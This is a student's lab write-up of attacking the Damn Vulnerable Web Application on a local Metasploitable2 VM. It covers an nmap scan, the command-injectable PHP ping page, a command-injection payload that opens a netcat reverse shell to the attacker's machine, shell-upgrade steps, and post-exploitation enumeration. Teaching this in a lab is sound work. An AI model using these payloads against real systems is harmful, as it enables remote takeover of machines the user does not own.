This lab uses [the N2H (Noobs 2 Hackers) Red Team Guide from ODU's Cybersecurity Student Association (CS2A) ](https://github.com/Cybersecurity-Student-Association/n2h-red/tree/main/01-Reverse%20Shells) 
## Intelligence Gathering
### Open Ports
Running the command 
```bash
sudo nmap -sV -sS -sC -A 192.168.56.117 -p-
```
(the IP address of my SEED VM ```192.168.56.117```) results in the following:
```
Nmap scan report for 192.168.56.117
Host is up (0.00026s latency).
Not shown: 65531 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 91:28:9a:6a:5e:b3:bf:cd:e5:36:3e:e8:13:ab:66:ba (RSA)
|   256 1a:fe:85:67:97:e9:47:0d:f7:6c:34:3c:35:4a:27:8d (ECDSA)
|_  256 53:fa:03:b6:15:44:8c:fd:4b:e1:76:2e:ef:12:a7:c3 (ED25519)
23/tcp open  telnet  Linux telnetd
80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) DAV/2)
|_http-server-header: Apache/2.2.8 (Ubuntu) DAV/2
|_http-title: Metasploitable2 - Linux
MAC Address: 08:00:27:88:55:C9 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.6
Network Distance: 1 hop
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
192.168.56.111
TRACEROUTE
HOP RTT     ADDRESS
1   0.26 ms 192.168.56.117

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.47 seconds
```

Opening the HTTP service on port 
The default credentials for [Damn Vulnerable Web Application (DVWA)](https://github.com/digininja/DVWA) are `admin/password`

## Vulnerability Analysis
Going to the `Command Execution` tab in DVWA, there is a field allowing users to ping an IP address. A screenshot of the page: 
![](Command_Injection_Screenshot.png?raw=true)
The "View Source" button gives the source code of the page. The source code is:
```php
 <?php if (isset($_POST["submit"])) {
     $target = $_REQUEST["ip"];

     // Determine OS and execute the ping command.
     if (stristr(php_uname("s"), "Windows NT")) {
         $cmd = shell_exec("ping  " . $target);
         echo "<pre>" . $cmd . "</pre>";
     } else {
         $cmd = shell_exec("ping  -c 3 " . $target);
         echo "<pre>" . $cmd . "</pre>";
     }
 } ?> 
```
From the code above, we can see that the `ip` field is vulnerable to command injection. This is what is known at remote code execution (RCE). This essentially means that any commands can be run on the machine through the `ip` field. RCE vulnerabilities can be mitigated by sanitization of input. Input sanitization removes unsafe characters from inputs. In this case, the semicolon (`;`) gives the ability to exit the `ping` command and execute another command.  
## Exploitation - Reverse Shells
### Step 1 - The Listener
```bash
nc -lnvp 9001
```
The program `netcat` is used to listen for incoming connections on port 9001. Here is a breakdown of the command:
- `nc` - the program `netcat`
- `-l` - create a listener
- `-n` - use numeric-only IP addresses
- `-v` - verbose mode
- `-p` - a port number. I chose 9001
Note: While I explain the different modifiers separately, they can be combined into a group. Linux allows combinations of switches for faster execution.
### Step 2 - Exploit RCE to Initiate the Reverse Shell
[This Reverse Shell Generator](https://www.revshells.com/) gives multiple commands which will create a reverse shell back to the attacker. In the `ip` field on the page, I enter my chosen reverse shell command.  The following worked for me: 
```bash
; nc -c sh 192.168.56.111 9001
```
A breakdown of the command:
- `;` -  the semicolon ends the previous command.
- `nc` - the netcat command
- `-c sh` - the command to execute when the connection is successful
- `192.168.56.111` - the IP address of my attacker machine
- `9001` - the port on my attacker machine listening for incoming connections
To the victim, the command will look like this:
```bash
ping ; nc -c sh 192.168.56.111 9001
```
The `ping` command will execute, but it will have no IP address to ping. Following that, the reverse shell will execute. It will create a connection back to the listener on the attacker machine. 
### Step 3 - Upgrading the Shell
From the [guide](https://github.com/Daniel-Tomov/n2h-red/blob/main/01-Reverse%20Shells/README.md) :
>Reverse shells are useful, but they have some limitations. For example, the key combination `ctrl-C` is a very common way to terminate a command in the shell. But, if you try this key combination in the reverse shell, you'll kill the shell and have to reestablish that connection, which can sometimes be very cumbersome. A common technique to upgrade a reverse shell is to use the Python TTY module.

To "upgrade" the shell, I used the following command in the terminal on the attacker side:
```bash
python -c 'import pty;pty.spawn("/bin/bash")'
```
Then press \<ctrl-z\> to put the process in the background. \<ctrl-z\> puts me back to the regular Kali shell. Then I use
```bash
stty raw -echo; fg
```
and 
```bash
export TERM=xterm
```
to get a "full" shell with ctrl-c and ctrl-l support.
## Post Exploitation
Below are the answers to the post exploitation questions from the guide:
- How many other users are on this machine? How do you know?
In the screenshot below, I ran the command
```bash
cat /etc/passwd | grep -v -E "/bin/false|nologin"
```
to see which users are on the system. I excluded users with `/bin/false` and `/usr/sbin/nologin` as default shells because they cannot login. There is one account which is an exception. The `ftp` user has a shell of `/bin/false`, but it has a folder in the `/home` folder. 
![](Users.png?raw=true)
- Can we use the credentials we found earlier for anything? If so, for what?
I tried using the `admin/password` credentials from earlier to login into the `ftp`, `user`, and `service` accounts, but the password `password` did not work. 
- Are there any other listening services/ports? (hint: use the `ss` and `netstat` utilities)
Running netstat shows there many processes with open ports running on the machine.
![](netstat.png?raw=true)
- What is the IP address of the exploited machine? Is this address the same as the one you used to access the website? Why or why not? If not, what does this suggest?
The IP of the exploited machine in this case is the `metasploitable2` Docker container. It will have a different IP address than the machine the Docker container is running on. In my case, the SEED VM has an IP address of `192.168.56.117`, but the metasploitable2 container's IP address is `172.16.10.2`. This indicates the DVWA application I attacked is running inside a Docker container.
- What other programs are running? Do any of them jump out as privilege escalation vectors? i.e., if we exploit them for a shell, which user will be running that shell?
The screenshot below contains the running processes in the metasploitable2 container. The `root` user has some processes. Maybe they can be exploited to gain further access.
[](Running_Processes.png?raw=true)
